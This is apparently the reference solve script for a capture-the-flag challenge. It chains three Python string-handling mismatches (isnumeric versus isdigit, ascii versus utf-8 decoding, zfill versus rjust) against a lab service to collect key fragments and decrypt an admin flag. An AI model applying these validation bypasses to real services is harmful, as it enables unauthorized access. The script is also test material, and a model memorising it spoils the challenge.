#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"; PORT="${PORT:-8297}"; FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"
python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import base64, hashlib, json, sys
from urllib.request import Request, urlopen
host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"
req = Request(base + "/api/session", data=b"{}", method="POST")
sid = json.loads(urlopen(req, timeout=5).read())["session"]
# Gap A: isnumeric vs isdigit. ½ (U+00BD): isdigit=False, isnumeric=True
req = Request(base + "/api/token/%C2%BD", headers={"X-Session": sid})
hex_a = json.loads(urlopen(req, timeout=5).read())["fragment"]
# Gap B: ascii vs utf-8 decode. base64(b'seal\xc2\xb2')
key = base64.b64encode(b'seal\xc2\xb2').decode()
req = Request(base + "/api/seal", headers={"X-Session": sid, "X-Seal-Key": key})
hex_b = json.loads(urlopen(req, timeout=5).read())["fragment"]
# Gap C: zfill vs rjust. "-500".rjust(6,'0')="00-500", zfill="-00500"
body = json.dumps({"code": "-500"}).encode()
req = Request(base + "/api/code", data=body,
              headers={"X-Session": sid, "Content-Type": "application/json"}, method="POST")
hex_c = json.loads(urlopen(req, timeout=5).read())["fragment"]
key = hashlib.sha256((hex_a + hex_b + hex_c).encode()).digest()[:32]
req = Request(base + "/api/admin", headers={"X-Session": sid})
payload = urlopen(req, timeout=5).read()
encrypted = payload[4:]
flag = bytes(b ^ key[i % len(key)] for i, b in enumerate(encrypted)).decode()
print(flag)
PY
